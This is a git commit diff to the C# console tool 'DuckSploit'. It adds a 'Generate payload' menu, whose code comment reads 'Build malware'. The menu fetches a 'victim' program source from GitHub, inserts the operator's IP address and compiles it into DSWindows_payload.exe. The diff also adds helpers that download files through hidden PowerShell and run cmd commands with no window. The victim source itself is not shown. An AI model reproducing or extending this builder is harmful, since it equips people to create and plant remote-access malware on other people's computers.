7453df6abd3479826ddd4adbc0b7b669c39e5a13
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-07-12 21:44:02 +0200

    Add files via upload

--- hacker/windows/program.cs
+++ hacker/windows/program.cs
@@ -16,6 +16,108 @@ namespace DSserver
 {
     class Program
     {
+		public static void Download(string url, string outPath)
+		{
+			string tempdir = Path.GetTempPath();
+			
+			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
+			
+			
+			url = '"' + url + '"';
+			
+			outPath = '"' + outPath + '"';
+			
+			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
+			
+			outPath = tempdir + "/download.ps1";
+			
+            // open or create file
+            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
+            // create stream writer
+            StreamWriter streamwrite = new StreamWriter(streamfile);
+            // add some lines
+			
+			outPath = '"' + tempdir + "/download.ps1" + '"';
+			
+			
+			// string powershelldownloadtxt = "" + url +"\  "
+            streamwrite.WriteLine(str);
+            // clear streamwrite data
+            streamwrite.Flush();
+            // close stream writer
+            streamwrite.Close();
+            // close stream file
+            streamfile.Close();
+			
+
+			// string error = "";
+			// int exitCode = 0;
+			string output = "";
+			
+			ProcessStartInfo processInfo;
+			Process process;
+			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
+			processInfo.CreateNoWindow = true;
+			processInfo.UseShellExecute = false;
+			processInfo.RedirectStandardOutput = true;
+			process = Process.Start(processInfo);
+			process.WaitForExit();
+			output = process.StandardOutput.ReadToEnd();
+			
+		}
+		public static void write_txt_to_file(string path, string str)
+		{
+			FileStream streamfile = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
+            // create stream writer
+            StreamWriter streamwrite = new StreamWriter(streamfile);
+            // add some lines
+			
+            streamwrite.WriteLine(str);
+            // clear streamwrite data
+            streamwrite.Flush();
+            // close stream writer
+            streamwrite.Close();
+            // close stream file
+            streamfile.Close();
+		}
+		public static void execute(string path)
+        {
+            
+			
+			string callcommand = "/c call " + path ;
+			
+			ProcessStartInfo processInfo;
+			Process process;
+			
+			string output = "";
+			
+			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
+			processInfo.CreateNoWindow = true;
+			processInfo.UseShellExecute = false;
+			processInfo.RedirectStandardOutput = true;
+			process = Process.Start(processInfo);
+			process.WaitForExit();
+			output = process.StandardOutput.ReadToEnd();
+        }
+		public static void execute_cmd(string cmd)
+        {
+            
+			
+			string callcommand = "/c " + cmd ;
+			
+			ProcessStartInfo processInfo;
+			Process process;
+			
+			string output = "";
+			
+			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
+			processInfo.CreateNoWindow = true;
+			processInfo.UseShellExecute = false;
+			processInfo.RedirectStandardOutput = true;
+			process = Process.Start(processInfo);
+			process.WaitForExit();
+			output = process.StandardOutput.ReadToEnd();
+        }
 		public static void sendmsg(string message, string color)
 		{
 			if (color == "red")
@@ -113,11 +215,23 @@ namespace DSserver
 			process = Process.Start(processInfo);
 			process.WaitForExit();
 		}
+		public static void exec_cmd(string cmd)
+		{
+			ProcessStartInfo processInfo;
+			Process process;
+			
+			processInfo = new ProcessStartInfo("cmd.exe", cmd);
+			processInfo.CreateNoWindow = true;
+			processInfo.UseShellExecute = false;
+			processInfo.RedirectStandardOutput = true;
+			process = Process.Start(processInfo);
+			process.WaitForExit();
+		}
         static void Main(string[] args)
         {
 			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
 			string tempdir = Path.GetTempPath(); 
-			string dir = userprofile + "/DuckSploit"; 
+			string dir = userprofile + "\\DuckSploit"; 
 			if (! Directory.Exists(dir)) 
 			{
 				Directory.CreateDirectory(dir);
@@ -147,10 +261,10 @@ namespace DSserver
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("2", "red");
 				sendmsg("] Open chat", "yellow");
-				// # Update
+				// # Build malware
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("3", "red");
-				sendmsg("] Update", "yellow");
+				sendmsg("] Generate payload", "yellow");
 				// # Visit website
 				sendmsgnonewline("    [", "yellow");
 				sendmsgnonewline("4", "red");
@@ -206,6 +320,10 @@ namespace DSserver
 								Console.Clear();
 
 							}
+							else if(input2 == "malware --help")
+							{
+								sendmsg(gethtmlcode("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/malwarehelp.txt"), "green");
+							}
 							else if(input[0] == "cls")
 							{
 								Console.Clear();
@@ -235,14 +353,106 @@ namespace DSserver
 				}
 				else if(menu == "3")
 				{
-					a = 1;
-					File.Delete(userprofile + "DuckSploit/ds.exe");
-					execpowershell("(New-Object System.Net.WebClient).DownloadFile('https://github.com/canarddu38/DUCKSPLOIT/raw/root/hacker/windows/ds.exe', '" userprofile "/ds.exe')");
+					Console.Clear();
+					int b = 0;
+					while(b == 0)
+					{
+						sendmsg("DuckSploit payload generator", "green");
+						Console.WriteLine(" ");
+						sendmsgnonewline("    [", "yellow");
+						sendmsgnonewline("1", "red");
+						sendmsg("] Windows", "yellow");
+						// # Windows
+						sendmsgnonewline("    [", "yellow");
+						sendmsgnonewline("2", "red");
+						sendmsg("] Linux", "yellow");
+						// # Linux
+						sendmsgnonewline("    [", "yellow");
+						sendmsgnonewline("3", "red");
+						sendmsg("] Android", "yellow");
+						// # Android
+						sendmsgnonewline("    [", "yellow");
+						sendmsgnonewline("4", "red");
+						sendmsg("] Exit", "yellow");
+
+						sendmsgnonewline("Choose option [", "green");
+						sendmsgnonewline("1", "yellow");
+						sendmsgnonewline(",", "red");
+						sendmsgnonewline("2", "yellow");
+						sendmsgnonewline(",", "red");
+						sendmsgnonewline("3", "yellow");
+						sendmsgnonewline(",", "red");
+						sendmsgnonewline("4", "yellow");
+						sendmsgnonewline("]: ", "green");
+						
+						string menu2 = Console.ReadLine(); 
+						if(menu2 == "1")
+						{
+							Console.Clear();
+							
+							if (File.Exists(@"C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe")) {
+								sendmsg("[o] csc.exe v3.5 is installed", "yellow");
+								Console.WriteLine(" ");
+								
+								sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
+								string myip = Console.ReadLine(); 
+								
+								sendmsg("Downloading executable...", "yellow");
+								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "/DSwindows.cs");
+								sendmsg("Downloaded!", "yellow");
+								
+								string text = File.ReadAllText(tempdir + "/DSwindows.cs");
+								text = text.Replace("<yourip>", myip);
+								File.WriteAllText(tempdir + "/DSwindows.cs", text);
+								Console.Clear();
+								sendmsg("Loading...", "yellow");
+								
+								execute_cmd("mkdir " + dir + "\\generated");
+								execute_cmd("call %windir%\\Microsoft.NET\\Framework\\v3.5\\csc.exe /out:" + dir + "\\generated\\DSWindows_payload.exe %temp%\\DSwindows.cs");
+								Console.Clear();
+								
+								sendmsg("DS payload is now generated! ", "yellow");
+								sendmsg("Can be found at: " + dir + "\\generated\\DSWindows_payload.exe", "yellow");
+							}
+							else
+							{
+								sendmsg("/!\\ MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload", "red");
+							}
+							b = 1;
+							Console.ReadKey();
+						}
+						else if(menu2 == "2")
+						{
+							Console.Clear();
+							Console.WriteLine("Linuxxxx");
+							b = 1;
+							Console.ReadKey();
+						}
+						else if(menu2 == "3")
+						{
+							Console.Clear();
+							Console.WriteLine("aaaandroid");
+							b = 1;
+							Console.ReadKey();
+						}
+						else if(menu2 == "4")
+						{
+							Console.Clear();
+							b = 1;
+						}
+						else
+						{
+							Console.Clear();
+							sendmsg("[x] Bad awnser, only 1,2,3,4 accepted", "red");
+						}
+					}
+					b = 0;
+					
 				}
 				else if(menu == "4")
 				{
 					a = 1;
-					System.Diagnostics.Process.Start("https://canarddu38.github.io/DUCKSPLOIT/");
+					System.Diagnostics.Process.Start("https://ducksploit.com");
 				}
 				else if(menu == "5")
 				{
